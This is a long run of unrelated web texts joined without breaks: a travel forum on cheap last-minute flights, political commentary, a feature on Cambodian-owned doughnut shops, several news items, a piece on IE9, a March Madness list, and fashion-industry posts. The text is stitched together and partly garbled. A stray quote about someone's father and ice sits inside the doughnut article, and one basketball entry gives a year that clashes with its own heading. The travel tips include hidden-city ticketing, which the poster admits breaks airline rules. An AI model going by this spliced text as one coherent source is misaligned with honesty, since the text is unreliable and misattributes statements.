However , if you were willing to drive to Asheville , the Delta fare is $ 896 with taxes , and you stop in Atlanta !
Do a one - way car rental to Asheville ( which can get pricey ) , do not check bags and ditch the last Atl to Asheville segment .
This is against the rules , but if you do it once , they probably wo n’t notice .
Birmingham is $ 774 w/ tax on United , but connects through Charlotte for a savings of $ 428 for two people minus the cost of driving .
If you get a red - eye and want to leave earlier , then most carriers charge a $ 50 stand by fee .
You can stand by for an earlier flight , and you pay $ 50 / person if you get on it .
You obviously only have to pay if you are successful .
This works well in hubs like Atlanta .
A lot of people like flexible fares , so they can cancel at any time , but I checked and they are well over $ 1000 / person for atl to sea .
Last minute air travel is always going to be painful unless you get super lucky 🙁

Hotwire and Travelocity !
Check them , its worth your time .
Travelocity has flexible date search , that may cheapen your fare .
Like another poster said , try and buy with as much time as you can .
If your sister - in - law is having the baby end of May , you could always aim for end of May and buy your ticket now .
Wcalvert : I initially disagreed with you , but math prevails !
The short story is that you are gambling a $ 150 change fee by guessing the right flight ahead of time .
You could further hedge your bet by buying two tickets for different 4 day periods , but you are ensuring you wo n’t get the best case scenario of only spending $ 670 total .
Ran all of the maths .
This is assuming a mostly guaranteed 14 day window .
Adding to this window does bad things to the math , heh .
If you wait until the last second and do nothing you would more than likely pay $ 1700 .
If you guess two tickets at the same time your best case scenario is $ 670 with a 28.57 % chance of success .
However , there is a 71.43 % chance of being wrong and having to pay $ 2000 total ( $ 670 ahead of time , $ 300 change fees , $ 1030 in additional fare ) for a “ net ” cost of $ 1620 if it ’s run an infinite number of times .
If you hedge your guess and buy two individual tickets at different 4 day periods your best case scenario is $ 1335 with a 73 % chance of you being right .
There is a 27 % chance of you being wrong and paying $ 2000 total .
“ net ” cost would be $ 1,516 .

If you ’re under 22 , try Airtran ’s standby program .
That ’ll at least get you to San Francisco for $ 99 one way on no notice .
Maybe then you could go on Southwest or one of the many commuter flights from SF to Seattle .
4. By Rajulkabir
It is common in Northern Europe to have last - minute ticket booths at the airport ; you can rock up with your luggage and a hundred euros and see where the winds will take you .
Unfortunately this does not happen in Atlanta .
No help , I know .

and How to Fly Standby
6. By Janie42156
Find a friend who works for the airline .
Standby tickets are a hassle , but cheap and an easy way to get from point A to B. Consider commuting from / to far - away airports .
Seattle to Dallas flights are booked solid , while Vancouver to Dallas are practically empty .
It ’s a similar situation with Portland to Dallas , too .
Currently you ’re fighting with Spring Break traffic , so get used to flights being full for the next few weeks .
Stay away from weekends .
Waiting for kids to be born sucks .
They can come early , late , or just on time and it is probably never enough time to book a flight unless you plan on staying for a month or two around the due - date to cover all your bases .

President Obama met with the Senate Democrats today , just like he did last week with House Republicans , and he made a point about the media and the influence they are having on the members of the Democratic party .
President : Last point I would make about this .
You know what I think would actually make a difference , Michael -- I think if everybody here -- excuse all the members of the press who are here -- if everybody here turned off your CNN , your Fox , your -- just turn off the TV -- MSNBC , blogs -- and just go talk to folks out there , instead of being in this echo chamber where the topic is constantly politics -- the topic is politics .
It is much more difficult to get a conversation focused on how are we going to help people than a conversation about how is this going to help or hurt somebody politically .
And that 's part of what the American people are just sick of -- because they do n't care , frankly , about majority and minorities and process and this and that .
They just want to know , are you delivering for me ?
And we 've got to , I think , get out of the echo chamber .
That was a mistake that I think I made last year , was just not getting out of here enough .
And it 's helpful when you do .
( Applause . )
It 's a little late with this recommendation , Mr. President .
The time to have spoken up was long before the August recess .
Your strategy basically allowed conservatives to take over the messaging and make the debate exactly what political operatives like Frank Luntz and Newt Gingrich had hoped for .
Hell , Luntz told Samantha
Bee that not being able to control a town hall meeting in 2005 could produce disastrous results for Bush .
Well , that came true .
The town halls became an exhibition of hatred , insanity and ignorance .
And as usual Fox News ignored this event , as they usually do .
The president also told Senate Dems to stop being afraid and get health - care reform done .
The president 's appeal on health care was especially noteworthy , given the initiative 's precarious future .
As has been the case of late , Obama did n't give lawmakers specific instructions -- at least not publicly -- but he made clear they must take advantage of this opportunity and deliver on the promise of reform .
" So many of us campaigned on the idea that we were going to change this health care system , " the president reminded the senators .
" So many of us looked people in the eye who had been denied because of a pre-existing condition , or just did n't have health insurance at all ... and we said we were going to change it .
Well , here we are with a chance to change it ....
I hope we do n't lose sight of why we 're here .
We 've got to finish the job on health care . "
Here 's hoping Democrats take the advice to heart .
And Obama made the point that they still have a huge majority in the Senate , which is something they do n't know how to use .
I understand that the GOP is using the filibuster at an insane level , but for those of us who worked hard to help get Dems elected , this has been incredibly frustrating .
And just as an aside , it was also interesting to see that the president apparently keeps up fairly well on media developments :
" There was apparently a headline after the Massachusetts election .
The Village Voice announced that Republicans win a 41 - 59 majority .
It 's worth thinking about .
We still have to lead . "
If the majorities change hands , you can be sure that if the Democratic Party obstructed like conservatives have , and turned the filibuster into a potent weapon for saying " no " , the Villagers would be screaming for the Dems to not be obstructionists , with David Broder leading the way .
The rule is that conservatives can do NO wrong .

The Tao of doughnuts came to California from Cambodia , of all places .
At night , the Tao of doughnuts is baking .
By day the Tao is in Santa Ana .
But most of all , I suspect , the Tao of doughnuts is exhausted .
Who can blame him ?
Bun H. Tao , a giant of the California doughnut business , must struggle night and day to reverse the declining fortunes of an industry on whose fate his own wealth rides .
It ’s like pushing a giant cruller uphill .
The doughnut business in California , in case you had n’t noticed , did two things during the 1980s .
First , it came to be dominated by Cambodian immigrants , of whom there are more than 70,000 in this state .
Second , it exploded ; new stores opened all over California .
Like so much that flourished during those intoxicating years , doughnuts today are in decline .
Southern California ’s doughnut market is especially saturated , and despite the loss of 40 or 50 stores in last year ’s riots , competition has kept a lid on prices .
People are also having second thoughts about scarfing down a dozen fat - fried , calorie - laden treats .
Advertisement
Worse yet , the Southern California economy is awful , and contrary to the impression our pastry - glutted mini-malls convey , doughnuts are n’t the staff of life .
A big part of the business is selling coffee and a doughnut to people on the way to work , but lately , too many do n’t have work , so they are n’t buying .
Drive around Hollywood and you ’ll bump into one doughnut shop after another , most of them owned by Cambodian immigrants and filled with unsold jellies , cremes and so forth .
From behind the counter at Windsor Donuts on Sunset Boulevard , Eny Ly says : “ Too many people do n’t have jobs . ”
As a result , entrepreneurs such as Bun Tao are struggling .
Tao ’s doughnut supply hH Distributors in Santa Ana , claims about $ 10 million in annual sales , almost all of it to Cambodian immigrants .
But business is so bad that too many of his 1,400 customers can’t pay for the equipment , doughnut mixes and other supplies they ’ve bought .
Struggling shops owe perhaps $ 700,000 , and hard times have forced him to slash his mark - up .
“ Things are very tough now , ” he says .
“ Every corner is doughnuts . ”

Tao has an awful lot tied up in all this .
He gives instant credit , for example , and has loaned 300 coffee machines to stores that buy coffee from him .
When doughnut - store owners lack the language skills or aggressiveness , he goes to bat with landlords who want higher rents .
His family is deep into doughnuts as well .
Tao , who is 34 now , took over a Cypress doughnut shop owned by an aunt .
“ I personally make doughnuts there every morning at 3 a.m. , ” he says .
New immigrant groups often follow one another into a single visible industry or line of work .
Chinese laundries and Greek diners were paths to wider success for earlier arrivals .
In Los Angeles today , get into a taxi and the driver is likely to be a Russian immigrant .
In California , for Cambodians , it ’s doughnuts .
With ready credit available from B & H , Cambodian families could get into business without much more than an appetite for hard work .
Husbands typically bake all night , while wives and teen - age children work the counter by day .
Many are open round the clock .

What was originally a phenomenon of Southern California soon spread north .
Tao ’s childhood friend , Robert Chau , who miraculously survived four years in a Khmer Rouge “ re-education ” camp and a hair - raising escape through Thailand , now owns B & H Distributors in Hayward , which handles abut 600 accounts in Northern California .
Business seems better there .
Chau ’s situation room has more than a dozen maps festooned with little flags representing customers , and Chau says he hopes to expand into Fresno .
Ultimately , the man responsible for all this is Ted Ngoy , a California doughnut visionary almost on a par with Verne Winchell .
A Cambodian of Chinese heritage ( like Tao and Chau ) , Ngoy was ambassador to Thailand under the Cambodian government of Lon Nol , so he was lucky enough to be out of the country when Pol Pot and his followers began the wholesale slaughter of their own people .
Under the circumstances , Ngoy decided not to go home .
Instead , he brought his nephew , Bun Tao , to California and went to work as manager of a Winchell ’s doughnut outlet in Newport Beach .
Advertisement
In 1977 , Ngoy got his own shop in La Habra , in which he set the pattern for the many Cambodians who would follow him into the business .
The store was a family operation .
Tao , in fact , baked doughnuts there every day .
A year later he opened a place of his own .
The Cambodian doughnut explosion had begun .
Consider that , back in 1977 , Ngoy was the first Cambodian immigrant to own a doughnut shop .
They did n’t even have doughnuts in Cambodia , after all .
Now consider that today , B & H north and south , the main suppliers to California ’s Cambodian doughnut stores , have perhaps 2,000 customers between them .
That ’s probably two - thirds of the doughnut shops in the state .
Inevitably , a question arises :
What are the natural limits to the doughnut market in California ?
In other words , how many doughnuts can Californians eat ?
California ’s biggest doughnut chain , Santa Ana - based Winchell ’s , has already had to retrench .
Mel Allison , Winchell ’s director of special projects and a 33 - year veteran of the business , says the chain now has about 200 California stores , down from perhaps twice as many in just seven or eight years .
Advertisement
He says competition comes not just from immigrants , but from chains such as McDonald ’s , Burger King and 7 - Eleven , which have gone into the breakfast business as well .
No doubt all of this was bad for Ngoy ( who lives in Mission Viejo but could n’t be reached for comment ) .
According to Bun Tao , his uncle owned 50 California doughnut shops at one point , before a series of reversals set in .
Now , says Tao , Ngoy is out of doughnuts .
His nephew , meanwhile , struggles on .
But the Tao of doughnuts sounds awfully tired .
Song Dehui , his father , said : " He is in a lot of pain all the time and if we do n't have enough ice he gets a fever . "
Do n't put burglars in jail ( unless they hurt someone ) , courts told
Burglars should only be jailed if they cause property damage or hurt someone , courts have been told .
( Posed by model )
Burglars should not be jailed unless they cause damage or hurt someone when committing their crime , Government advisers said yesterday .
The Sentencing Advisory Panel called for judges and magistrates not to hand down prison sentences to ordinary burglars who were responsible for ' minimal loss or damage ' .
But even criminals who operate in gangs or steal large sums of money may walk free under the guidelines , which suggest ' community ' punishment for many offenders .
The recommendations contradict last year 's ruling by Lord Chief Justice Lord Judge , which stated that jail should be the ' normally appropriate ' punishment for convicted burglars .
Instead , the Sentencing Advisory Panel said yesterday that ' any starting point for domestic burglary should be non-custodial ' .
Damage , harm to householders or other factors making the crime more serious should make a jail sentence more likely , it suggested .
But its report acknowledged that some experts had expressed ' grave concern ' over the advice .
The recommendations to let burglars walk free come as , for the first time in several years , burglaries are increasing .
Police recorded more than 284,000 burglaries last year , a one per cent increase on the previous year , and the Panel report said the crime was ' still sufficiently common to affect many individuals and households ' .
The Panel has for the past decade existed to advise judges on sentencing .
However , it will be abolished in April and replaced by a new Sentencing Council .
Its report is nevertheless likely to be considered by its successor .
Criminologist Dr David Green , from think tank Civitas , said : ' Burglary is a shocking invasion of privacy .
While a burglar may not attack anybody , many are prepared to do so if detected .
' Police have recorded rising numbers of burglaries in the latest figures .
The recommendation that burglars should not be jailed sends completely the wrong message . '
The guidance from the Sentencing Advisory Panel , which is headed by academic lawyer Professor Andrew Ashworth QC , appears the first challenge from within the judicial establishment to the tougher approach introduced by Lord Judge .
Since becoming leader of the judiciary in England and Wales in 2008 , he has reversed the liberalising moves of his predecessors by ordering longer sentences for armed criminals and murderers .
Fox Broadcasting is inching closer to bringing Conan O’Brien back to late night .
Key Fox executives , including Rupert Murdoch , are on board with the plan and would like to finalize a deal in coming weeks so they can make a splash on May 17 when the network unveils its fall lineup .
Several significant issues remain and the Fox talks could fall apart , according to people close to the negotiations who asked anonymity because the discussions were meant to be private .
But people close to O’Brien are cautiously optimistic .
“ We ’ll get there , ” one of them said Tuesday .

Fox executives have been huddling to figure out how much it will cost to mount a late - night talk show that would be profitable for Fox stations and affiliates .
Stations , hammered by the advertising recession , rely on the profits generated by syndicated reruns such as “ The Simpsons ” and “ The Office , ” and it ’s unclear how many stations would be willing to substitute those shows for a risky venture -- even one starring a big - name host .
Fox realizes that if it ever wants to get into the late - night game , this is the time .
The network , owned by Murdoch ’s News Corp. , has had its eye on entering the late - night talk show wars for years .
Indeed , it was Fox ’s overtures to O’Brien nine years ago that prompted NBC ’s Jeff Zucker to promise O’Brien “ The Tonight Show ” to keep him at the peacock network .
Zucker ’s plan famously unraveled when Jay Leno decided he was n’t ready to retire .
Fox Entertainment President Kevin Reilly and Entertainment Chairman Peter Rice have been leading the campaign to bring O’Brien to Fox , according to knowledgeable people .
But their bosses have told them to demonstrate that a late show would be financially viable .
A breakthrough came last week when they outlined a late - night scenario that one executive described as “ a deal that we could live with . ”
Advertisement
It has n’t been decided whether the show would launch in the fall or January .
Fox , however , is unwilling to spend the money that NBC had been paying to support “ The Tonight Show ” with O’Brien .
NBC spent close to $ 90 million a year to produce the show , which included O’Brien ’s salary of more than $ 12 million a year .
Fox wants to spend less than $ 60 million a year for the show , said people close to the discussions .
O’Brien ’s camp is weighing whether it can pull off a high - quality show with the smaller budget -- or if it should shift to cable .
The major hurdle comes from Fox stations , which are obligated to air reruns at specific time periods , in some cases after the 10 p.m. news .
That would mean forcing a proposed O’Brien show , at least initially , to air at different time periods : 11 p.m. in some markets , 11:30 -- or later -- in other cities .

“ Without a uniform start time , it would be hard to get traction for a show and hard to promote it , ” said Jason Maltby , a top ad buyer for the firm Mindshare .
“ Saying , ‘ Check your local listings ’ does n’t have the same ring to it as saying , ‘ “ The Tonight Show at 11:35 p.m . ” ’ “
After the expiration of the stations ’ agreements for sitcoms in late night , the O’Brien show would run at the same time -- likely 11 p.m .
The challenge would be getting to the two - year mark by maintaining a large enough audience and enough advertisers to make the show successful .
“ Late night is already pretty full -- everyone has carved out their own niche , ” said Maltby .
“ It comes down to the available audience and how you slice it . ”
Fox is the likely outlet for a traditional network late - night show , but it ’s not O’Brien ’s only option , said people close to the comedian .
Several cable channels have expressed an interest , although Comedy Central -- which would appear to be a natural fit -- is not on the list , these people said .

Comedy Central already has its big stars in late night , Jon Stewart and Stephen Colbert , so the earliest available time period for O’Brien would be at midnight .
That would not be acceptable to O’Brien , who surrendered “ The Tonight Show ” when NBC said it planned to shift his start time to 12:05 a.m .
O’Brien ’s team also is working to secure a soundstage for a new show and could use the same facility on the Universal lot that NBC spent nearly $ 50 million to refurbish for O’Brien to take over “ The Tonight Show ” in June .
The soundstage -- the home of the Jack Benny show -- is large enough to accommodate skits , a band and a studio audience -- and is close to Lankershim Boulevard , making it easy to manage crowds who come to the show .
NBC Universal has said it would lease the space to O’Brien , despite the tensions that exploded when O’Brien refused to accept NBC ’s shift of the “ Tonight Show ” to make room for Leno ’s return to late night .
But that is n’t the only option .
O’Brien ’s team has been busy scouting other soundstages during the last two weeks .

In addition , O’Brien and his representatives have been organizing a swing through 30 cities , including Los Angeles , for his Legally Prohibited From Being Funny on Television Tour .
The tour intends to allow O’Brien to connect with his fans at a time when his breakup pact with NBC prevents him from appearing on television until September .

Pelosi gives Rangel some breathing room
House Speaker Nancy Pelosi wo n't consider removing Ways and Means Committee Chairman Charles Rangel from his powerful post before the ethics panel wraps up a wide - ranging investigation of the New York Democrat .
Some fellow Democrats would like Rangel to step aside as chairman in the wake of the ethics ruling .
But the speaker continues to stand by Rangel after the House ethics committee slapped him on the wrist for violating House rules by accepting trips to the Caribbean that were sponsored , in part , by corporations .
It is a public admonishment , " Pelosi said in a taped interview airing Sunday on ABC's " This Week . "
" It said he did not knowingly violate House rules .
So that gives him some comfort . "
Pelosi said she wants to wait until the House Committee on Standards of Official Conduct , informally known as the ethics committee , completes its work before she will make any decisions about whether Rangel should retain his chairmanship on the powerful tax - writing committee .
" What Mr. Rangel has been admonished for is not good , " Pelosi said , according to an advance transcript of her remarks .
" It was a violation of the rules of the House . "
But she said , his actions were not " something that jeopardized our country in any way . "
Kushboo 's comments created a stir
The Supreme Court in India has endorsed the right of unmarried couples to live together in a case involving an actress accused of outraging public decency .
A three - judge panel in Delhi pointed out that even Hindu Gods Lord Krishna and Radha were co-habiting lovers .
Actress Kushboo was appealing to the court to quash more than 20 cases filed against her in 2005 .
In a 2005 interview she said it was not wrong for women to have pre-marital sex as long as they took precautions .
She said that it was also " not fair of any educated youth to expect his wife to be a virgin " .
The remarks stirred controversy in a conservative country where pre-marital sex is still a cultural taboo .
Some Tamil nationalist political groups accused the actress of making derogatory and obscene remarks against Tamil culture .
Several cases have been filed against her across Tamil Nadu in various courts under different sections of the Indian penal code .
If found guilty , she faces imprisonment or a fine .
Central tenet
" When two adult people want to live together , what is the offence ? " the judges said .
" Living together is not an offence .
Living together is a right to life . "
The judges said they were " not bothered " by Kushboo 's personal views and reserved judgement on her petition .
Marriage remains a central tenet in India , with weddings celebrated in lavish style and many households made up of extended families .
The BBC's Geeta Pandey in Delhi in India says that pre-marital sex will remain taboo in India - despite Wednesday 's ruling - and live - in relationships are rare and frowned upon by society .
Microsoft is previewing Internet Explorer 9 - and it promises to add a stack of new technologies that may make it one of the most advanced browsers out there .
No , really .
Among the elements that Microsoft is touting are SVG ( scalable vector graphics ) capability , background compiled Javascript for greater speed , and - gasp ! - HTML5 integration .
So at Mix10 , where it was first shown off on stage , people got to see it playing a YouTube video ... without using Flash .
Which is of course going to add mightily to the debate about whether Flash is dying , dead but does n't know it , alarmingly healthy but just being overlooked by these whippersnappers , or simply going to evolve and be a happy shiny part of the future web as we know it .
IE9 's adoption of newer technologies , and technologies such as SVG which have been around for ages but not had that special Microsoft embrace , certainly makes it look like the company is trying to catch up and even overtake a lot of the other rival browsers out there .
But it 's still struggling a bit on some of the CSS parts - notably the W3 C 's evil Acid3 test ( warning : page will be slow as your browser chugs through the 100 - part test ) [ nah , just my browser having a sulky moment ] , on which it only scores 55 out of 100 .
( Firefox 3.6 scores 94 92 , while Apple 's Safari 4 scores 100/100 . )
Then again , that 's better than IE8 , which only managed 20/100 .
The big change though is the move towards HTML5 , which had n't frankly been expected .
Last November Dean Hachamovich noted on the Microsoft Developer Network blog that
" Our focus is providing rich capabilities – the ones that most developers want to use – in an interoperable way .
Developers want more capabilities in the browser to build great apps and experiences ; they want them to work in an interoperable way so they do n't have to re-write and re-test their sites again and again .
The standards process offers a good means to that end "
However Jeffrey Zeldman is less impressed :
" Microsoft 's marketing department wants the public to believe that IE and Windows are profoundly innovative .
Thus efforts to catch up to the typographic legibility and beauty of Mac OS X and Webkit browsers are presented , in Dean Hachamovitch 's blog post , as leading - edge innovations .
Do n't get me wrong : these improvements are desirable , and Direct2D may be great .
I 'm not challenging the quality of the hardware and software improvements ; I 'm pointing out the enforced bragging , which is mandated from on high , and which flies in the face of the humble stance other high - level divisions in Microsoft would like to enforce in the wake of the company 's European drubbing and the dents Apple and Google have made on its monopoly and invulnerability . "
Well , it has to be said that the principal dent that 's been put in Microsoft 's monopoly have come from the European Commission and , to a lesser extent , the US Department of Justice ; and that following that it 's been Firefox ( which , it 's true , does get funding from Google via its built - in search box ) .
It 's interesting to try to figure out quite what has dented Microsoft 's monopoly : its profits are n't going down , its cash pile is still vast , and it 's still the predominant operating system on the desktop ( or laptop ) .
Even so , Zeldman concludes :
" By torturing the IE rendering engine every couple of years instead of putting it out of its misery , Microsoft contributes to the withering away of its own monopoly .
That might not be good for the shareholders , but it is great for everyone else . "
The reality is though that it 's things like the browser ballot screen that are really going to make the difference to IE 's monopoly .
But with that said , one has to welcome a browser from Microsoft that incorporates emerging web standards .
Now let 's hope that all the people stuck on IE6 can upgrade ...
The Why and How of Linked Data March 22 , 2010
I ’m just past halfway through nine consecutive days of all day meetings , clustered around the W3 C ’s semi-annual Advisory Committee meeting .
When this series started , I did n’t have any particular responsibilities , beyond attending .
But then John Sheridan had to canceled his trip , and I was tapped to stand in for him on panels at both the AC meeting ( this morning ) and FOSE tomorrow .
My slides do n’t stand on their own very well , but here they are anyway .
There might be video of the FOSE talk , later .
And if you ’re in Washington , by all means , drop by !
1 . Why linked data is important for government open data initiatives .
This was for a panel showing how Linked Data is being adopted , in various ways , in various industries , for an audience ( W3C staff and member representatives ) who were , perhaps , tired of hearing about the promise of the Semantic Web .
2. How To Do Open Data ( in 10 minutes ) .
This is for an audience of federal IT managers / vendors who are mostly unfamiliar with the concept of RDF .
Buzzer Beaters are the epitome of the March Madness experience , and unfortunately so far we have n’t experienced any in this year ’s tournament ( other than that UPS commercial which is causing bitterness amongst Kentucky fans ) .
So in hopes that we get some last second heroics over the weekend , we share some of the best of years past .
10 . UCLA vs. Missouri , 1995
The shot is not much more than a glorified lay - up , but it ’s definitely a memorable finish .
And the Bruins went on to with the national title , making this buzzer beater even more meaningful .
So why not rank it higher ?
The fact that Bruin guard Tyus Edney ran the entire length of the court , whipped it behind his back , and still managed to get a lay - up in 4.8 seconds seems more of a testament to Missouri ’s poor defense than a miraculous play .
But kudos to Edney for exploiting the Tiger ’s ¡ Ole ! style defense .
9. Arkansas vs. Louisville , 1981
This one is impressive in many ways , and not so much in others .
Defending champion Louisville faced Arkansas with a spot in the Sweet Sixteen on the line .
Down 73 - 71 , Arkansas had the ball with only fives seconds left to play and the length of the court in front of them .
Tyus Edney managed to go the full length of the court for UCLA as seen above .
U.S. Reed showed what not to do in this situation , putzing around and only going half the distance that Edney did .
Of course , that ’s also all he needed to make the game - winner .
8. Connecticut vs. Washington , 1998
If at first you do n’t succeed , try again .
In this 1998 battle of the Huskies , second - seeded UConn faced off against eleventh - seeded Washington .
Down by one point with ten seconds left in the game , Connecticut went for the game winner .
After misses by Jake Voskuhl and Richard Hamilton , the ball is tipped back to Hamilton in the chaos and he he launches a fadeawaythat propels the Huskies , the UConn Huskies that is , to victory , 74 - 73 .
7. Maryland vs. UNC - Wilmington , 2003
Maryland had won the title in 2002 , but lost the core of their team to graduation and the NBA Draft .
No longer a powerhouse , the Terrapins found themselves down 73 - 72 to eleventh seeded UNC - Wilmington in the 2003 first round .
On the final play , the ball is given to Juan - Dixon lite , Drew Nicholas .
I especially like this shot because Nicholas hits the shot on the dead run and just leaves his follow through hand hanging .
It ’s so good , he ’s just gonna leave his hand up there .
6. Northwestern State vs. Iowa , 2003
Fourteenth seeded and Southland Conference auto - bid Northwestern State Demons trailed the entire game , at least until a unbelievable three with under one second remaining .
Iowa had missed a free throw right before the clip , making the deficit just two and giving the Demons one shot at glory .
And they took it .
5. Georgia Tech v. USC , 1992
The “ Holy mackerel ! ” play is part of March Madness lore .
You ’ll probably hear the clip play a few time this Big Dance .
The play occurred in the second round battle between seventh - seeded Georgia Tech and Baby Jordan ’s second - seeded University of Southern California .
The Trojans led 78 - 76 , and only 0.8 seconds stood between them and the Sweet 16 .
But the Yellow Jackets had one final play , with the in - bounds pass coming near half - court .
What happened ?
A miracle three - pointer from James Forrest , who had n’t hit a three all year .
4. Valparaiso vs. Mississippi , 1998
Valparaiso ’s Bryce Drew was the coach ’s son , so you know expectations were high .
Presented with his big moment , the kid missed a go ahead three as time wound down .
Mississippi star Ansu Sesay got the rebound and was fouled .
However , he missed the front end of the one - and - one , giving the ball back to the Crusaders .
That left Drew and Valpo with 2.5 seconds to go the length of the floor with no timeouts .
The hook and lateral play , dubbed “ Pacer , ” was executed to perfection and Drew stunned the Rebels with a last second three .
3. Connecticut vs. Clemson , 1990
Yes , Connecticut again .
As a kid , I had given up on this game .
I was rooting for UConn , mainly because they were one team that would beat the hated Georgetown Hoyas .
Unable to watch on television , I was listening to the call on the radio on my way home that Thursday night .
Clemson hit two free throws with 1 second left to take a 70 - 69 lead .
Pissed off , I turned off the radio figuring Clemson had won .
Hours later while watching the nightly news , I found out that Scott Burrell had heaved a long pass to Tate George , who hit a turn - around jumper to win the game .
My favorite part of the clip is the UConn Huskie sprinting out onto the court right after the basket .
Although after the Devendorf controversy , I think they might have waived this one off if replay existed .
2. North Carolina State vs. Houston , 1983
The setting was the 1985 NCAA Championship , where Jim Valvano and the Cardiac Kids were heavy underdogs to Houston ’s Phi Slama Jama , led by then Akeem Olajuwon and Clyde Drexler .
With the scored tied late , State ’s Derek Wittenberg attempted a game winning shot , only to airball right it to team Lorenzo Charles .
Thankfully , Charles slammed it home for the national title .
Coach Valvano runs wildly on to the court and Wittenberg can claim it was all planned out that way .
1. “ The Shot ” , Kentucky vs. Duke , 1992
It ’s simply the most famous shot of the NCAA Tournament .
With 2.1 seconds remaining in overtime , Duke trailed Kentucky 103-102 .
And remember , this was a Kentucky team coming off probation without much star power outside of Jamal Mashburn .
So there was a bit of a David vs. Goliath factor to it .
Grant Hill lobs a perfect pass 3 / 4s the length of the court to Christian Laettner , who faked , dribbled once , and hit a turnaround jumper as time expired .
Of course he made it , Laettner did n’t miss a shot all game .
And thus ended one of college basketball ’s greatest games .
The only sour part is that Goliath won .
I really hate Duke , but even I must admit this moment is remembered throughout college basketball ( and famously recreated by Chris Farley ) .
And I must say , it ’s not a bad way to be remembered .
To make the shot even more memorable , Duke went on to capture the national title .
Without this shot , that ’s one less Duke championship .
Oh , and bonus points for the Thomas Hill face .
Yesterday , students at the University of Mississippi voted to update their image with a new mascot .
The previous mascot Colonel Reb , who resembles a antebellum plantation owner , has n't been seen at a game since 2003 , due to his Confederate symbolism .
Who , or what , will the new mascot be ?
The athletic teams at Ole Miss are the Rebels , so the logical symbol would be Admiral Ackbar , the highest ranking member of the Rebel Alliance in the Star Wars universe .
Only time will tell if the students and administration at Ole Miss will embrace the campaign .

ORLANDO , Fla . –
The labor movement , determined to build its membership among the nation ’s youth , will sponsor a Young Leaders Conference this June in Washington .
The announcement was made last week here at the AFL - CIO ’s executive council meeting by Liz Shuler , the federation ’s secretary - treasurer .
There will , according to Shuler , be a series of preparatory gatherings in five cities between now and the time of the conference .
During an interview here Shuler said the summit , which will bring together the nation ’s young union leaders , is aimed also at drawing major participation from young leaders and members of a broad range of community and other organizations including student groups .
Shuler , 39 , is the second woman and the youngest person ever to hold the second most powerful position in the U.S. labor movement .
“ We ’ll use the summit to pick their brains about what would be the best ways to attract young people to organized labor , ” Shuler said .
The intention , she said , is to begin building the labor movement in earnest among people between 18 and 35 years of age .
Labor Department figures indicate that among those 16 - 24 years old only 4.7 percent are unionized , compared to 15.7 percent of those aged 45 - 54 and 16.6 percent of those between 55 and 64 .
Shuler warns , however , that the labor movement has problems in the area of youth participation that go well beyond just the issue of numbers .
“ We have to get our house in order before we can attract young people , ” she said .
“ They ’re very transient workers and we must find out what will get them to be interested in unions and what turns them off . ”
In the overall economy , she noted , a new model of work is developing and “ a lot of young people are caught up in that new model while many unions are not . ”
Shuler said that many attitudes prevalent in the labor movement also need to be changed .
She recounted the difficulties she faced with people resenting her activism in her own union , the International Brotherhood of Electrical Workers local in Portland , Oregon .
“ People told me I should n’t be speaking up until I was around for at least five years , ” she said .
Shuler explained that “ one piece of the problem is how to deal with seniority in the labor movement . ”
She said there was a need to include young members in the line - up for succession to many of the currently graying union leaders .
Shuler , herself , was promoted to the position of top aide to IBEW President Ed Hill before she was elected last fall to her current AFL - CIO position .
Shuler prepared and delivered a report on how to attract youth to the executive council during its meeting .
In that report she identified six objectives that she said all unions , state federations and state labor councils must achieve if they are to make unions more attractive to young workers .
The report calls for creation of “ a permanent and unified structure for young workers . ”
It proposes creation of a mentoring program to help train young union members to move into leadership positions .
It calls also for a major new focus on organizing drives in places where young workers are concentrated .
The report tackles another area , one Shuler calls the need for “ long - term training and education . ”
“ We ’re even going to have to reach down into secondary schools where we can build community and student partnerships , ” Shuler said , “ providing resources for existing leaders and emerging leaders . ”

Leading fashion site , style.com has just changed the fashion news game by launching Fashion Feed , an aggregated news site for all the latest fashion buzz from around the real time and social web .
The new site brings together all the greatest sources for fashion , beauty , gossip and street style from across the web and ranks the content into lists of what ’s important as determined by the Internet , not some ice - queen who wears Prada holed up in an office in Manhattan .
The core of the site is the engine behind We Are Hunted , a site which revolutionised the idea of the music chart .
My feeling is that Fashion Feed will do the same to fashion news .
The aim , according to the Syle.com team , is to make Fashion Feed the starting point for up - to - the - minute top news on designers , models , celebrities , labels impacting the world of fashion .
Using the site is dead simple .
The main landing page gives a quick scan of the top 10 “ most buzzed about ” or “ latest news ” stories , along with similar top 10 lists specific to beauty and street style blogs .
The top 10 lists show thumbnails of images from those blog posts , and with a click the user can navigate to read that story on the original blog while also staying within the Fashion Feed navigation .
Fashion Feed ’s ‘ engine ’ also extracts mentions of specific people and labels in these blog posts .
Along with the ability to read a story , there ’s also a link that takes a user deep into news about a specific designer , model , celebrity , and label mentioned .
Overall , the Fashion Feed represents headlines from over 150 sources and over 500 entities .
Another nice feature is the charting functionality that presents the Top 40 most buzzed and influential about designers , models , celebrities and labels .
Stephen Phillips from We Are Hunted ( as well as Australian startup Wotnews , which built the semantic engine behind Fashion Feed ) , was happy with the outcome , if a little tired :
“ We built the site in about 3 weeks to be ready in time for NY Fashion week that starts Thursday . ”
“ It ’s been lots of fun working with a company on the other side of the world , especially one as well - known as Conde Naste , the owner of Style.com as well as media properties such as Vogue , GQ , Reddit and Wired . ”
When asked about the nature of the partnership between We Are Hunted and Conde Naste Phillips said :
“ We licensed our tech to Conde Nast in a similar deal to the one we did with Macquarie Bank when building their next - generation share - trading platform last year .
They designed the front end of the site , we built it using our platform . “
The site has had a couple of back - end issues this morning – DNS errors are being returned from time to time – but a refresh normally sorts this out .
If you ’re a fashionista this is definitely one to check out and pass around to your friends .

Many fashion designers have beautiful fashion croquis to show their designs , aesthetic , and render fabrications .
While they look nice , and require a great amount of both time and artistic talent , a technical illustration is needed to communicate your design to your pattern maker and sewing contractor .
A technical drawing differs from a fashion croqui in that it shows a flat rendering of your design , and shows your pattern maker the relationships and proportions between style lines , placement of buttons and zippers , and even stitch types such as top stitching or flat felled seams .
Often special seams will be annotated on the drawing .
Most technical drawings are created on the computer , using a program such as Adobe Illustrator .
If you feel comfortable , you ( the designer ) can do this yourself , or you can hire an illustrator .
Most companies will charge per illustration , rather than by the hour .
A good technical illustration , also called a " flat " , will be a scale drawing of your design , both front and back view , and sometimes include detailed drawings of a particular piece , such as a unique pocket design or embroidery .
Solid lines show seams , dotted or dashed lines show stitching .
Flats are not usually colored in , especially when being used to show the design to your pattern maker , however some designers use flats in their line sheets to show buyers , and in this case it would be appropriate to show colors and prints if applicable .
